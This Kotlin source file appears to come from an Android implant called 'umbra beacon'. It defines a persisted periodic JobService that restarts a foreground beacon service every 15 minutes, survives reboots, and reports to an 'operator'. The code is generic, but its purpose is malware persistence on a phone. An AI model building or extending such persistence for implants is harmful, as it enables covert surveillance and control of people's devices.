package io.umbra.beacon

import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobService

/**
 * The periodic work of the phone.
 *
 * The job scheduler is the system's own answer to "come back later": the
 * job survives a reboot, it is not killed with the app, and the system
 * schedules it again when the phone was asleep.  It is the closest thing
 * the platform has to the WorkManager of AndroidX -- which this build does
 * not use, because the beacon has no third-party dependency at all.
 *
 * The job does not talk to the server: it starts the foreground service,
 * and the service does the talking.
 */
class UmbraJobService : JobService() {
    override fun onStartJob(params: JobParameters?): Boolean {
        BeaconService.start(this)
        // The work is over as soon as the service is up: the beacon does
        // the talking itself.
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        // The system stopped the job before it was done: it should run
        // again.
        return true
    }

    companion object {
        /** The id of the periodic job of the implant. */
        const val JOB_ID = 4711

        /** How often the job wakes the service. */
        const val JOB_INTERVAL_MS = 15 * 60 * 1000L

        /** The description of the job, for the operator's report. */
        fun describe(context: android.content.Context): String {
            val info = JobInfo.Builder(
                JOB_ID,
                android.content.ComponentName(context, UmbraJobService::class.java),
            )
                .setPeriodic(JOB_INTERVAL_MS)
                .setPersisted(true)
                .build()
            return "job ${info.id} every ${info.intervalMillis / 60000} minutes"
        }
    }
}
